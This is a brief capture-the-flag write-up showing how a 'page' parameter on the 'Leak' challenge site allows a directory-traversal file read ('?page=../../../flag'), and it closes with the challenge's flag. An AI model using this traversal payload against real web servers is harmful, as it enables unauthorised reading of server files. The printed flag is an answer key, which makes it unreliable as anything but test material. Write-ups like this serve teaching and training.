# Leak

## Write-Up

When checking the description, here is what we can find :

```
the flag is in /flag, can you get it?
```

So our first intuition is to check for the `/flag` route, but unfortunatly, we get an error :

```
Hmmm I can't find that.
```

But when we see closly, we can find that the sent html page is not sent by checking the route but by checking a parameter called `page` :

```
http://leak.web-server.challs.ctf.shellmates.club/?page=index.html
```

Further more, when trying to access the flag using that parameter, here is what we get :

```
http://leak.web-server.challs.ctf.shellmates.club/?page=/flag
```

```
Page '/ctf/app/templates//flag' does not exist
```

So, the solution is to use that parameter and navigate back the root `/` folder, then look for the flag :

```
leak.web-server.challs.ctf.shellmates.club/?page=../../../flag
```

After requesting that, we get `flag` file containing the flag

## Flag

shellmates{LFIIII_FTW_3287964286}